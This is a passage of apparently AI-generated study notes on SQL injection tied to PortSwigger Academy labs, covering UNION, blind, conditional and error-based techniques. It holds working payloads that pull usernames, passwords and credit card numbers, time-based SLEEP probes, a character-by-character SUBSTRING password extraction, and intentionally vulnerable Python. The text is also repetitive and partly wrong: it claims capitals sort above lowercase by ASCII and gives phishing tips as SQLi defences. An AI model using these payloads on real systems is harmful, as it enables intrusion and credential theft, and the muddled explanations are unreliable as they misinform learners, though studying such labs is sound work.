<li><strong>Sanitize user input:</strong> This involves removing any special characters that could be used to inject malicious code.</li>
<li><strong>Use a web application firewall (WAF):</strong> A WAF is a software application that can help to protect web applications from a variety of attacks, including SQL injection attacks.</li>
</ul>
<p>Determining the number of columns required in a SQL injection UNION attack involves a trial-and-error process. The goal is to identify the number of columns needed in the injected query to match the columns selected in the original query. Here's a step-by-step approach to finding the correct number of columns:</p>
<ol>
<li>
<p><strong>Identify a Vulnerable Parameter:</strong> First, you need to find a parameter in the application's URL or form inputs that is vulnerable to SQL injection. This parameter should be directly used in an SQL query without proper sanitization.</p>
</li>
<li>
<p><strong>Inject an Initial Query:</strong> Once you've identified the vulnerable parameter, inject a simple query that returns a known number of columns, such as <code>SELECT 1</code>.</p>
</li>
<li>
<p><strong>Test for Errors:</strong> Submit the injected query and observe the response. If you see an error, it means the query wasn't executed successfully. Try changing the injected query until you get a valid response without errors.</p>
</li>
<li>
<p><strong>Use UNION SELECT:</strong> Now, modify the injected query to use the <code>UNION SELECT</code> statement to combine it with the original query. For example, if the original query is:</p>
<pre><code class="language-sql">SELECT column1, column2, column3 FROM table_name WHERE some_condition;
</code></pre>
<p>Your injected query should look like:</p>
<pre><code class="language-sql">injected_parameter' UNION SELECT 1, 2, 3 --
</code></pre>
<p>The <code>--</code> at the end of the injected query is used to comment out any remaining SQL code.</p>
</li>
<li>
<p><strong>Check the Number of Columns:</strong> After injecting the <code>UNION SELECT</code> statement, check the response from the application. If the number of columns in the injected query matches the number of columns in the original query, you will get a valid response. Otherwise, you might get an error or incomplete results.</p>
</li>
<li>
<p><strong>Increment the Number of Columns:</strong> If the number of columns in the injected query doesn't match the original query, keep incrementing the number of columns in the <code>UNION SELECT</code> statement until you get a valid response. For example:</p>
<pre><code class="language-sql">injected_parameter' UNION SELECT 1, 2, 3, 4 --
injected_parameter' UNION SELECT 1, 2, 3, 4, 5 --
</code></pre>
</li>
<li>
<p><strong>Fine-tune the Data Types:</strong> Once you find the correct number of columns, you may need to fine-tune the data types and format in the <code>UNION SELECT</code> statement to match the data types of the columns in the original query. You can use functions like <code>CAST</code> or <code>CONVERT</code> to achieve this.</p>
</li>
</ol>
<p>Remember that the number of columns may vary depending on the application and the specific query you are targeting. The trial-and-error process may take some time, but it's crucial for successful SQL injection UNION attacks. Be patient and thorough in your testing.</p>
<p>Sure. The SQL injection UNION attack, determining the number of columns returned by the query tutorial example in PortSwigger Academy demonstrates how an attacker can use a UNION attack to determine the number of columns returned by a query.</p>

<p>This query will combine the results of the <code>SELECT name, 'a' FROM users</code> query with the results of the <code>SELECT email, 'a' FROM users</code> query. The result set will contain all of the names and emails of the users in the database, along with the string &quot;a&quot;.</p>
<p>The attacker can then count the number of columns in the result set. This will be the number of columns returned by the original query.</p>
<p>The attacker could then use this information to launch further attacks, such as phishing attacks or password guessing attacks.</p>

<p>When performing a SQL injection UNION attack, it is important to find columns with a useful data type. This is because the attacker can only extract data from columns with a data type that can be returned by the database.</p>
<p>For example, if the attacker is trying to extract the names of all users in the database, they would need to find a column with a data type that can store text. If the only column with a text data type is the <code>email</code> column, the attacker would only be able to extract the email addresses of all users in the database.</p>
<p>Here are some of the most common data types that can be returned by the database:</p>
<ul>
<li><strong>CHAR:</strong> This data type stores a fixed-length string of characters.</li>
<li><strong>VARCHAR:</strong> This data type stores a variable-length string of characters.</li>
<li><strong>TEXT:</strong> This data type stores a large string of characters.</li>
<li><strong>INT:</strong> This data type stores an integer value.</li>
<li><strong>FLOAT:</strong> This data type stores a floating-point value.</li>
</ul>
<p>The attacker can use the <code>SELECT</code> statement to find columns with a useful data type. For example, the following statement would return all columns in the <code>users</code> table that have a data type of <code>VARCHAR</code>:</p>
<pre><code class="language-sql">SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' AND DATA_TYPE = 'VARCHAR';
</code></pre>
<p>Once the attacker has found a column with a useful data type, they can use it to extract data from the database.</p>
<p>Here are some ways to protect against UNION attacks:</p>
<ul>
<li><strong>Use prepared statements:</strong> Prepared statements are a way of preventing SQL injection attacks by binding the input parameters to the query before it is executed.</li>
<li><strong>Sanitize user input:</strong> This involves removing any special characters that could be used to inject malicious code.</li>
<li><strong>Use a web application firewall (WAF):</strong> A WAF is a software application that can help to protect web applications from a variety of attacks, including SQL injection attacks.</li>
</ul>
<p>In a SQL injection UNION attack, once you've determined the number of columns required in the injected query (as explained in the previous response), the next step is to identify columns with useful data types that can reveal valuable information. Typically, you want to find columns containing sensitive data such as usernames, passwords, or other valuable information.</p>
<p>Here's a step-by-step approach to finding columns with useful data types in a SQL injection UNION attack:</p>
<ol>
<li>
<p><strong>Identify Potential Columns:</strong> Inject the <code>UNION SELECT</code> statement into the vulnerable parameter as explained before, and make sure the injected query returns the same number of columns as the original query. For example:</p>
<pre><code class="language-sql">injected_parameter' UNION SELECT 1, 2, 3 --
</code></pre>
</li>
<li>
<p><strong>Observe the Response:</strong> Examine the application's response after the injection. The injected data will likely appear somewhere on the page. If it doesn't appear directly, it might still influence the page layout or structure.</p>
</li>
<li>
<p><strong>Identify Data Type Mismatch:</strong> If the data types in the injected query do not match the data types in the original query, you may receive an error or unexpected output. In this case, you need to identify the correct data types for each column.</p>
</li>
<li>
<p><strong>Fine-Tune Data Types:</strong> To find columns with useful data types, you can use various SQL functions like <code>CAST</code>, <code>CONVERT</code>, or string concatenation (<code>||</code>) to manipulate the data types in the <code>UNION SELECT</code> statement. For example:</p>
<pre><code class="language-sql">injected_parameter' UNION SELECT CAST('admin' AS TEXT), username, password FROM users --
</code></pre>
<p>In this example, we cast the string <code>'admin'</code> as the data type <code>TEXT</code> to match the data type of the <code>username</code> column in the original query.</p>
</li>
<li>
<p><strong>Check for Valuable Data:</strong> Observe the response again after fine-tuning the data types. Look for information that appears as a result of the injected query. You may find sensitive data like usernames or passwords in the application's response.</p>
</li>
<li>
<p><strong>Explore Different Tables:</strong> Depending on the application's database schema, you may want to explore different tables by changing the table names in the <code>FROM</code> clause of the injected query. For example:</p>
<pre><code class="language-sql">injected_parameter' UNION SELECT username, email, credit_card_number FROM customers --
</code></pre>
<p>In this example, we assume there is a table named <code>customers</code> that contains columns like <code>username</code>, <code>email</code>, and <code>credit_card_number</code>.</p>
</li>
<li>
<p><strong>Retrieve Sensitive Data:</strong> Once you identify columns with useful data types, you can retrieve sensitive information from the database through the SQL injection UNION attack. For example, you might extract usernames and hashed passwords to attempt password cracking.</p>
</li>
</ol>
<p>It's essential to be cautious and ethical when conducting SQL injection attacks. Always seek permission from the application's owner before performing any security testing, and ensure you are not violating any laws or regulations during your testing process.</p>
<p>Sure. The SQL injection UNION attack, finding a column containing text tutorial example in PortSwigger Academy demonstrates how an attacker can use a UNION attack to find a column containing text in a database.</p>
<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.</p>
<p>The website is vulnerable to SQL injection because it does not properly sanitize user input. This means that an attacker can inject malicious SQL code into the website's database.</p>
<p>The attacker can use this vulnerability to find a column containing text by using a UNION attack. A UNION attack is a technique that allows an attacker to combine the results of two or more SQL queries into a single result set.</p>
<p>To exploit this vulnerability, the attacker would first need to identify a database table that contains the data they want to retrieve. They can do this by submitting a variety of malicious SQL queries and observing the results. Once the attacker has identified a table, they can then use a UNION attack to find a column containing text.</p>
<p>For example, the attacker could submit the following malicious query:</p>
<pre><code class="language-sql">SELECT name, 'a' FROM users UNION SELECT email, 'a' FROM users;
</code></pre>
<p>This query will combine the results of the <code>SELECT name, 'a' FROM users</code> query with the results of the <code>SELECT email, 'a' FROM users</code> query. The result set will contain all of the names and emails of the users in the database, along with the string &quot;a&quot;.</p>
<p>The attacker can then search the result set for the string &quot;a&quot;. If they find it in a column, they know that the column contains text.</p>
<p>The attacker could then use this information to launch further attacks, such as phishing attacks or password guessing attacks.</p>
<p>The SQL injection UNION attack, finding a column containing text tutorial example is a good demonstration of how an attacker can use a UNION attack to find a column containing text in a database. It is important to be aware of this vulnerability and to take steps to protect yourself.</p>
<p>Here are some tips for protecting yourself from UNION attacks:</p>

<p>A SQL injection UNION attack is a type of SQL injection attack where the attacker injects a UNION statement into a database query. This allows the attacker to combine the results of two or more queries, which can be used to extract sensitive data from the database.</p>
<p>For example, let's say there is a web application that allows users to search for products. The application uses a SQL query to retrieve the results of the search. The query might look something like this:</p>
<pre><code class="language-sql">SELECT * FROM products WHERE product_name LIKE '%search_term%';
</code></pre>
<p>An attacker could inject a UNION statement into the query like this:</p>
<pre><code class="language-sql">SELECT * FROM products WHERE product_name LIKE '%search_term%' UNION SELECT * FROM users;
</code></pre>
<p>This would cause the database to return the results of both queries, which would include the names and email addresses of all users in the database.</p>
<p>Here is another example. Let's say there is a web application that allows users to log in. The application uses a SQL query to check the username and password of the user. The query might look something like this:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = 'username' AND password = 'password';
</code></pre>
<p>An attacker could inject a UNION statement into the query like this:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = 'username' AND password = 'password' UNION SELECT 1, 2, 3;
</code></pre>
<p>This would cause the database to return the results of both queries, which would include the first three rows in the <code>users</code> table.</p>
<p>UNION attacks can be very powerful, and they can be used to extract sensitive data from a database. It is important to protect your web applications from SQL injection attacks by using prepared statements and other security measures.</p>
<p>Here are some ways to protect against UNION attacks:</p>
<ul>
<li><strong>Use prepared statements:</strong> Prepared statements are a way of preventing SQL injection attacks by binding the input parameters to the query before it is executed.</li>
<li><strong>Sanitize user input:</strong> This involves removing any special characters that could be used to inject malicious code.</li>
<li><strong>Use a web application firewall (WAF):</strong> A WAF is a software application that can help to protect web applications from a variety of attacks, including SQL injection attacks.</li>
</ul>
<p>To retrieve interesting data using a UNION attack, the attacker would need to know the structure of the database and the data types of the columns. Once the attacker knows this information, they can inject a UNION statement that will return the data they are interested in.</p>
<p>For example, if the attacker is interested in the names and email addresses of all users in the database, they would need to inject a UNION statement that returns the <code>name</code> and <code>email</code> columns from the <code>users</code> table.</p>
<p>The attacker would also need to know the number of columns in the <code>users</code> table. This is because the UNION statement must have the same number of columns as the original query.</p>
<p>Once the attacker has injected the UNION statement, they can submit it to the web application. The database will then return the results of both queries, which will include the data that the attacker is interested in.</p>
<p>It is important to note that UNION attacks can be very difficult to detect. This is because the attacker can use the UNION statement to return data that is similar to the data that is returned by the original query. This makes it difficult for the web application to detect that an attack has occurred.</p>
<p>Here are some ways to detect UNION attacks:</p>
<ul>
<li><strong>Use a web application firewall (WAF):</strong> A WAF can be used to detect UNION attacks by looking for patterns in the traffic that is sent to the web application.</li>
<li><strong>Use anomaly detection:</strong> Anomaly detection can be used to detect UNION attacks by looking for patterns that are not normally seen in the traffic that is sent to the web application.</li>
<li><strong>Use manual auditing:</strong> Manual auditing can be used to detect UNION attacks by looking for patterns in the data that is returned by the web application.</li>
</ul>
<p>I hope this helps! Let me know if you have any other questions.</p>
<p>In a SQL injection UNION attack, the UNION operator is used to combine the results of a malicious query with the results of a legitimate query. This technique allows an attacker to retrieve interesting or sensitive data from the database that they are not authorized to access directly.</p>
<p>Here's how a SQL injection UNION attack can be used to retrieve interesting data:</p>
<ol>
<li>
<p><strong>Identify a Vulnerable Parameter:</strong> Find a parameter in the application that is vulnerable to SQL injection. This parameter should be used in an SQL query without proper validation and sanitization.</p>
</li>
<li>
<p><strong>Determine the Number of Columns:</strong> Use a trial-and-error approach to determine the number of columns required in the injected query. This involves injecting <code>UNION SELECT</code> statements with different numbers of columns until you get a valid response.</p>
</li>
<li>
<p><strong>Find Columns with Useful Data Types:</strong> Once you know the correct number of columns, identify columns in the database that contain interesting or sensitive data. Common targets include usernames, passwords, email addresses, credit card numbers, or other confidential information.</p>
</li>
<li>
<p><strong>Fine-Tune the Data Types:</strong> Adjust the data types of the <code>UNION SELECT</code> statement to match the data types of the columns in the original query. This may involve using functions like <code>CAST</code> or <code>CONVERT</code> to ensure compatibility.</p>
</li>
<li>
<p><strong>Retrieve Interesting Data:</strong> Execute the SQL injection UNION attack with the modified <code>UNION SELECT</code> statement to retrieve the interesting data. The results of the injected query will be combined with the results of the original query, and the interesting data will be presented in the application's response.</p>
</li>
</ol>
<p>For example, consider a vulnerable application with the following SQL query to fetch user information based on the provided username:</p>
<pre><code class="language-sql">SELECT username, email, address FROM users WHERE username = 'input';
</code></pre>
<p>An attacker discovers that the &quot;username&quot; parameter is vulnerable to SQL injection. They can use a UNION attack to retrieve the email addresses of all users in the database. Suppose the injected query looks like this:</p>
<pre><code>' UNION SELECT null, email, null FROM users --
</code></pre>
<p>The modified query will be:</p>
<pre><code class="language-sql">SELECT username, email, address FROM users WHERE username = '' UNION SELECT null, email, null FROM users --';
</code></pre>
<p>The injected query adds a <code>UNION SELECT</code> statement to fetch the &quot;email&quot; column from the &quot;users&quot; table. The application will execute this injected query alongside the original query and return the concatenated results.</p>
<p>With the successful execution of the SQL injection UNION attack, the attacker can extract email addresses from the database and access sensitive user information.</p>
<p>It is crucial to note that SQL injection attacks are illegal and unethical unless you have explicit permission to test the security of an application. Always follow responsible disclosure practices and obtain proper authorization before attempting any security testing.</p>
<p>Try this: </p>
<pre><code class="language-sql">' UNION SELECT username, password FROM users--
</code></pre>

<div style="break-before: page; page-break-before: always;"></div><h1 id="blind-sqli"><a class="header" href="#blind-sqli">Blind SQLi</a></h1>
<p>Blind SQL injection is a type of SQL injection attack where the attacker cannot see the results of the injected query. This means that the attacker cannot use traditional techniques such as UNION attacks to extract data from the database.</p>
<p>Instead, blind SQL injection attacks rely on the database to behave differently depending on the value of the injected query. For example, the attacker might inject a query that causes the database to sleep for a certain amount of time if the value of the query is true, and to return immediately if the value of the query is false.</p>
<p>The attacker can then use this behavior to infer the value of the injected query by observing the response time of the database. For example, if the database takes a long time to respond when the attacker injects the value &quot;1&quot;, then the attacker can infer that the value of the query is true.</p>
<p>Here is an example of a blind SQL injection attack:</p>
<p>The attacker wants to know the name of the database. They know that the database name is stored in the <code>database</code> table, and that the <code>database</code> table has a column called <code>name</code>.</p>
<p>The attacker injects the following query into the application:</p>
<pre><code class="language-sql">' OR SLEEP(5)
</code></pre>
<p>If the value of the <code>database</code> column is &quot;test&quot;, then the database will sleep for 5 seconds before returning the results. If the value of the <code>database</code> column is not &quot;test&quot;, then the database will return the results immediately.</p>
<p>The attacker can then use the response time of the database to infer the value of the <code>database</code> column. If the database takes a long time to respond, then the attacker can infer that the value of the <code>database</code> column is &quot;test&quot;.</p>
<p>Blind SQL injection attacks can be very difficult to defend against. This is because the attacker does not need to see the results of the injected query in order to extract data from the database.</p>
<p>However, there are a number of things that can be done to reduce the risk of blind SQL injection attacks. These include:</p>
<ul>
<li>Using prepared statements to prevent SQL injection attacks.</li>
<li>Validating user input carefully.</li>
<li>Using a web application firewall to block malicious traffic.</li>
</ul>
<p>By following these steps, you can help to reduce the risk of blind SQL injection attacks on your web application.</p>
<p>Blind SQL injection is a type of SQL injection attack where an attacker can exploit a vulnerability in a web application to retrieve information from the database without directly seeing the results. In blind SQL injection, the application does not display the results of the injected query, making it harder for the attacker to extract data. However, the attacker can infer information based on the application's behavior or responses.</p>
<p>There are two main types of blind SQL injection attacks:</p>
<ol>
<li>
<p><strong>Boolean-Based Blind SQL Injection:</strong>
In a boolean-based blind SQL injection, the attacker crafts SQL queries with conditional statements that result in a true or false response. The application's behavior or response will indicate whether the condition is true or false, allowing the attacker to infer information.</p>
<p>Example:
Suppose a vulnerable login form uses the following SQL query to check the credentials:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = '&lt;input_username&gt;' AND password = '&lt;input_password&gt;';
</code></pre>
<p>The attacker could inject the following payload:</p>
<pre><code>' OR 1=1; -- (input_username)
</code></pre>
<p>The modified query will be:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = '' OR 1=1; -- ' AND password = '&lt;input_password&gt;';
</code></pre>
<p>If the application's response indicates a successful login, it means the injected condition <code>1=1</code> is true, and the attacker knows the username is valid.</p>
</li>
<li>
<p><strong>Time-Based Blind SQL Injection:</strong>
In time-based blind SQL injection, the attacker crafts SQL queries that introduce delays in the application's response. The attacker can infer information based on whether the response is delayed or not.</p>
<p>Example:
Suppose the application uses the following query to retrieve data:</p>
<pre><code class="language-sql">SELECT * FROM products WHERE product_id = '&lt;input_product_id&gt;';
</code></pre>
<p>The attacker could inject the following payload:</p>
<pre><code>' OR IF(1=1, SLEEP(5), 0); -- (input_product_id)
</code></pre>
<p>The modified query will introduce a delay of 5 seconds if the condition <code>1=1</code> is true. The attacker can then observe the application's response time to infer whether the condition is true or false.</p>
</li>
</ol>
<p>Blind SQL injection attacks can be more challenging to exploit than standard SQL injection because the attacker does not directly see the results of the injected query. However, they can be successful by carefully crafting payloads and analyzing the application's behavior or responses. It's essential for developers to follow secure coding practices, input validation, and parameterized queries to prevent SQL injection vulnerabilities.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="conditional-response"><a class="header" href="#conditional-response">Conditional response</a></h1>
<p>A conditional query is a query that uses a conditional statement to determine which rows are returned. The most common conditional statement used in SQL is the <code>IF</code> statement. The <code>IF</code> statement takes a condition as input and returns one value if the condition is true and another value if the condition is false.</p>
<p>For example, the following SQL query uses the <code>IF</code> statement to return the name of the user if the user is logged in and the message &quot;You are not logged in&quot; if the user is not logged in:</p>
<pre><code class="language-sql">SELECT
  IF(user_id IS NOT NULL, user_name, 'You are not logged in')
FROM users;
</code></pre>
<p>Another common conditional statement used in SQL is the <code>CASE</code> statement. The <code>CASE</code> statement takes a value as input and returns one value if the value matches a certain condition, another value if the value matches another condition, and so on.</p>
<p>For example, the following SQL query uses the <code>CASE</code> statement to return the name of the user's department if the user is in the marketing department, the name of the user's department if the user is in the sales department, and &quot;Unknown&quot; if the user is not in either department:</p>
<pre><code class="language-sql">SELECT
  CASE
    WHEN department = 'marketing' THEN 'Marketing'
    WHEN department = 'sales' THEN 'Sales'
    ELSE 'Unknown'
  END
FROM users;
</code></pre>
<p>Conditional queries can be used to trigger conditional responses in a variety of ways. For example, you could use a conditional query to determine whether to show a message to the user, to determine which data to return to the user, or to determine which action to take based on the user's input.</p>
<p>Here are some examples of how you could use conditional queries to trigger conditional responses:</p>
<ul>
<li>You could use a conditional query to determine whether to show a message to the user. For example, you could use a conditional query to show a message to the user if they are logged in and not authorized to view a certain page.</li>
<li>You could use a conditional query to determine which data to return to the user. For example, you could use a conditional query to return different data to the user depending on their role in the organization.</li>
<li>You could use a conditional query to determine which action to take based on the user's input. For example, you could use a conditional query to take different actions depending on whether the user clicks a button or enters text into a field.</li>
</ul>
<p>In SQL injection attacks, you can craft conditional queries that trigger different responses from the application to infer information indirectly. These conditional queries typically use boolean expressions or time-based functions to control the behavior of the injected SQL statement. Below are some examples of conditional queries that can be used in SQL injection attacks to trigger different responses:</p>
<ol>
<li>
<p><strong>Boolean-Based Conditional Queries:</strong>
These queries rely on boolean expressions that evaluate to either true or false.</p>
<p>a. Boolean-Based True Condition:</p>
<pre><code>' OR 1=1; --
</code></pre>
<p>This will always evaluate to true, causing the injected part of the SQL statement to be executed.</p>
<p>b. Boolean-Based False Condition:</p>
<pre><code>' OR 1=2; --
</code></pre>
<p>This will always evaluate to false, effectively nullifying the original condition and allowing all data to be retrieved.</p>
<p>c. Conditional Based on Database Content:</p>
<pre><code>' OR (SELECT COUNT(*) FROM users WHERE role = 'admin') &gt; 0; --
</code></pre>
<p>This will trigger a response if the 'users' table contains at least one row with a 'role' column set to 'admin'.</p>
</li>
<li>
<p><strong>Time-Based Conditional Queries:</strong>
These queries introduce delays in the application's response to infer whether a condition is true or false based on the response time.</p>
<p>a. Time-Based True Condition:</p>
<pre><code>' OR IF(1=1, SLEEP(5), 0); --
</code></pre>
<p>This will introduce a delay of 5 seconds if the condition <code>1=1</code> is true, indicating a successful injection.</p>
<p>b. Time-Based False Condition:</p>
<pre><code>' OR IF(1=2, SLEEP(5), 0); --
</code></pre>
<p>This will not introduce any delay, as the condition <code>1=2</code> is always false.</p>
</li>

<h2 id="substring"><a class="header" href="#substring">Substring</a></h2>
<p>Here is a table of the substring method in different databases:</p>
<div class="table-wrapper"><table><thead><tr><th>Database</th><th>Substring method</th></tr></thead><tbody>
<tr><td>MySQL</td><td><code>SUBSTRING</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SUBSTRING</code></td></tr>
<tr><td>Oracle</td><td><code>SUBSTR</code></td></tr>
<tr><td>SQL Server</td><td><code>SUBSTRING</code></td></tr>
<tr><td>MariaDB</td><td><code>SUBSTRING</code></td></tr>
<tr><td>SQLite</td><td><code>SUBSTR</code></td></tr>
</tbody></table>
</div>
<p>As you can see, most databases use the <code>SUBSTRING</code> method for extracting substrings from strings. However, Oracle uses the <code>SUBSTR</code> method instead.</p>
<p>Here is an example of how to use the <code>SUBSTRING</code> method in MySQL:</p>
<pre><code class="language-sql">SELECT SUBSTRING('Hello, world!', 6, 5);
</code></pre>
<p>This query will return the substring &quot;world&quot; from the string &quot;Hello, world!&quot;. The first argument to the <code>SUBSTRING</code> method is the string that you want to extract the substring from. The second argument is the starting position of the substring. The third argument is the length of the substring.</p>
<p>More sensitive example with substring that will eventually determine the password
works like this:</p>
<pre><code class="language-sql">' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) &gt; 'o
</code></pre>
<p>This query will return true if the first letter of <code>administrator</code> password is
greater than <code>o</code></p>
<p>Let's say you already managed to close this up to two letter, then you perform
this query:</p>
<pre><code class="language-sql">' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b
</code></pre>
<p>You will get your indirect result. If it's true, if not, something else will
happend, depending ont the particular blind SQL injection vulnerebility.</p>
<p>To check if the first letter of a column is greater than Z in SQL, you can use the following code:</p>
<pre><code class="language-sql">SELECT
  column_name
FROM
  table_name
WHERE
  LOWER(SUBSTRING(column_name, 1, 1)) &gt; 'z';
</code></pre>
<p>This code will first use the <code>SUBSTRING</code> function to extract the first letter of the column name. Then, it will use the <code>LOWER</code> function to convert the letter to lowercase. Finally, it will use the <code>&gt;</code> operator to compare the lowercase letter to the letter Z.</p>
<p>If the first letter of the column name is greater than Z, then the query will return the row. Otherwise, the query will not return the row.</p>
<p>In SQL, capital and lowercase letters are treated differently when compared using the <code>&gt;</code> sign. Capital letters are considered to be greater than lowercase letters. For example, the letter <code>A</code> is greater than the letter <code>a</code>.</p>
<p>This is because the ASCII code for capital letters is greater than the ASCII code for lowercase letters. The ASCII code for <code>A</code> is 65, while the ASCII code for <code>a</code> is 97.</p>
<p>Therefore, if you are comparing two strings that contain capital and lowercase letters, you need to make sure that both strings are converted to the same case before you compare them.</p>
<p>In SQL, by default, string comparisons are case-insensitive, meaning that capital and small letters are treated as the same. For example, 'abc' is considered equal to 'ABC' in a standard string comparison.</p>
<p>However, if you want to perform a case-sensitive comparison in SQL, you can use the appropriate collation for your comparison. A collation is a set of rules that determines how data is sorted and compared in a database.</p>
<p>To perform a case-sensitive comparison, you need to use a case-sensitive collation. The collation name typically includes the word &quot;CS&quot; (case-sensitive) or &quot;BIN&quot; (binary). Here's how you can use case-sensitive collations in different SQL database systems:</p>
<ol>
<li>
<p><strong>MySQL:</strong>
In MySQL, you can use the <code>BINARY</code> keyword or specify a case-sensitive collation, such as <code>utf8_bin</code> or <code>latin1_bin</code>, for your comparison.</p>
<p>Example with <code>BINARY</code> keyword:</p>
<pre><code class="language-sql">SELECT * FROM table_name WHERE BINARY column_name = 'caseSensitiveValue';
</code></pre>
<p>Example with a specific collation:</p>
<pre><code class="language-sql">SELECT * FROM table_name WHERE column_name COLLATE utf8_bin = 'caseSensitiveValue';
</code></pre>
</li>
<li>
<p><strong>SQL Server (Transact-SQL):</strong>
In SQL Server, you can use the <code>COLLATE</code> clause to specify a case-sensitive collation for your comparison.</p>
<p>Example:</p>
<pre><code class="language-sql">SELECT * FROM table_name WHERE column_name COLLATE Latin1_General_BIN = 'caseSensitiveValue';
</code></pre>
</li>
<li>
<p><strong>PostgreSQL:</strong>
In PostgreSQL, you can use the <code>COLLATE</code> clause with a case-sensitive collation.</p>
<p>Example:</p>
<pre><code class="language-sql">SELECT * FROM table_name WHERE column_name COLLATE &quot;C&quot; = 'caseSensitiveValue';
</code></pre>
</li>
<li>
<p><strong>Oracle:</strong>
In Oracle, string comparisons are generally case-sensitive by default. However, if you want to ensure case-sensitive comparison, you can use the <code>BINARY</code> operator or the <code>NLSSORT</code> function.</p>
<p>Example with <code>BINARY</code>:</p>
<pre><code class="language-sql">SELECT * FROM table_name WHERE column_name = BINARY 'caseSensitiveValue';
</code></pre>
<p>Example with <code>NLSSORT</code>:</p>
<pre><code class="language-sql">SELECT * FROM table_name WHERE NLSSORT(column_name, 'NLS_SORT=BINARY') = NLSSORT('caseSensitiveValue', 'NLS_SORT=BINARY');
</code></pre>
</li>
</ol>
<p>Please note that case-sensitive comparisons can have performance implications and might not be suitable for every situation. Use case-sensitive comparisons only when necessary and consider the impact on performance and search results.</p>
<p>Whether comparing letters in SQL is case sensitive depends on the database you are using. Some databases, such as MySQL and PostgreSQL, are case-insensitive by default, while others, such as Oracle and SQL Server, are case-sensitive by default.</p>
<p>You can check the case sensitivity of a database by looking at the collation of the database. The collation is a set of rules that determine how characters are compared.</p>
<p>If you want to make a comparison that is case-sensitive, you can use the <code>BINARY</code> operator. The <code>BINARY</code> operator will compare the two strings using their ASCII values, which means that capital letters will be considered greater than lowercase letters.</p>
<p>For example, the following query will return all rows where the <code>column</code> column contains the letter <code>A</code> in uppercase:</p>
<pre><code class="language-sql">SELECT *
FROM table
WHERE column = BINARY 'A';
</code></pre>
<p>If you want to make a comparison that is case-insensitive, you can use the <code>ILIKE</code> operator. The <code>ILIKE</code> operator will compare the two strings ignoring case.</p>
<p>For example, the following query will return all rows where the <code>column</code> column contains the letter <code>A</code> in either uppercase or lowercase:</p>
<pre><code class="language-sql">SELECT *
FROM table
WHERE column ILIKE 'A';
</code></pre>

<p>Sure. The Blind SQL injection with conditional responses tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to blind SQL injection attacks by using conditional responses.</p>
<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.</p>
<p>The website is vulnerable to blind SQL injection because it does not properly sanitize user input. This means that an attacker can inject malicious SQL code into the website's database.</p>
<p>The attacker can use this vulnerability to extract data from the database by injecting malicious SQL code that will cause a conditional response. When the error occurs, the website will not display an error message to the user, but the response will change depending on whether the condition is true or false.</p>
<p>To exploit this vulnerability, the attacker would first need to identify a database table that they want to extract data from. They can do this by submitting a variety of malicious SQL queries and observing the responses. Once the attacker has identified a table, they can then use conditional responses to extract the table contents.</p>
<p>The Blind SQL injection with conditional responses tutorial example is a good demonstration of how a website can be vulnerable to blind SQL injection attacks by using conditional responses. It is important to be aware of these vulnerabilities and to take steps to protect yourself.</p>
<p>Here are some tips for protecting yourself from blind SQL injection attacks:</p>
<ul>
<li>Use a strong username and password for your online accounts.</li>
<li>Change your passwords regularly.</li>
<li>Be suspicious of emails or text messages that ask for your personal information.</li>
<li>Install antivirus software and keep it up to date.</li>
<li>Be careful about what websites you visit and what links you click on.</li>
<li>Train yourself and your employees on how to identify and avoid phishing attacks.</li>
</ul>
<p>By following these tips, you can help to protect yourself from blind SQL injection attacks and keep your accounts safe.</p>
<p>In addition to the tips above, there are a few things that the website can do to protect itself from blind SQL injection attacks:</p>
<ul>
<li>Use a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.</li>
<li>Use a honeypot account to lure attackers into entering malicious SQL queries.</li>
<li>Implement a CAPTCHA challenge to verify that the user is human.</li>
<li>Use a prepared statement mechanism to prevent attackers from injecting malicious SQL code into the database.</li>
<li>Use a database auditing mechanism to detect and log suspicious SQL queries.</li>
</ul>
<p>By implementing these measures, the website can help to protect itself from blind SQL injection attacks.</p>

<p>Error-based SQL injection is a type of SQL injection attack that relies on the database server generating an error message when the attacker's input is invalid. This error message can be used to extract information about the database structure or even the data itself.</p>
<p>To exploit an error-based SQL injection vulnerability, the attacker must first identify a parameter in the application that is used to execute a SQL query. The attacker can then inject malicious code into the parameter in an attempt to cause the database server to generate an error message.</p>
<p>The error message will typically contain information about the SQL query that was executed, such as the table names and column names. This information can be used by the attacker to further exploit the vulnerability. In some cases, the error message may even contain the actual data that is stored in the database.</p>
<p>Error-based SQL injection attacks can be very difficult to prevent. One way to protect against these attacks is to use prepared statements. Prepared statements are a way of executing SQL queries that are more secure than regular SQL queries. When a prepared statement is executed, the database server will not execute the query until all of the parameters have been bound. This helps to prevent the attacker from injecting malicious code into the query.</p>
<p>Another way to protect against error-based SQL injection attacks is to use input validation. Input validation is the process of checking user input to ensure that it is valid. This can help to prevent the attacker from injecting malicious code into the application.</p>
<p>Here are some additional tips for preventing error-based SQL injection attacks:</p>
<ul>
<li>Use prepared statements whenever possible.</li>
<li>Use input validation to check user input.</li>
<li>Enable error logging so that you can see if any errors are occurring.</li>
<li>Keep your software up to date with the latest security patches.</li>
</ul>
<p>Error-based SQL injection attacks can be a serious security threat. By following these tips, you can help to protect your applications from these attacks.</p>
<p>Error-based SQL injection is a type of SQL injection attack that relies on exploiting SQL syntax errors or error messages returned by the database server. The attacker injects malicious input into a vulnerable parameter, causing the SQL query to produce an error. The error message, containing sensitive information or details about the database structure, is then used by the attacker to gather information or manipulate the application.</p>
<p>Here's an example of an error-based SQL injection:</p>
<p>Consider a simple web application that takes a user ID as a parameter to fetch user data from the database. The application constructs an SQL query dynamically without properly sanitizing the user input.</p>
<p>The vulnerable code might look like this (simplified for illustration purposes):</p>
<pre><code class="language-python">import sqlite3

def fetch_user_data(user_id):
    # Construct the SQL query with the user input
    query = f&quot;SELECT username, email FROM users WHERE id = {user_id}&quot;

    # Execute the query and fetch the result
